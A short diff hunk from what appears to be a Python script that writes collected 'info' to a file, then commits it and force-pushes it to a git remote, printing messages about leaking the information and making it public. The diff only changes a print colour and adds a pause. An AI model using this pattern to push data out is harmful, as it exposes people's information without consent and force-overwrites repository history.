@@ -34,10 +34,11 @@ text = info
 file = open('info.txt', 'w')
 file.write(text)
 file.close()
-print(RED+"leaking info to database!")
+print(BLUE+"leaking info to database!")
 
 system('git add .')
 system('git commit -m "info"')
 system('git push -f origin master')
 print(RED+"Info Is now public!")
+time.sleep(100)
 
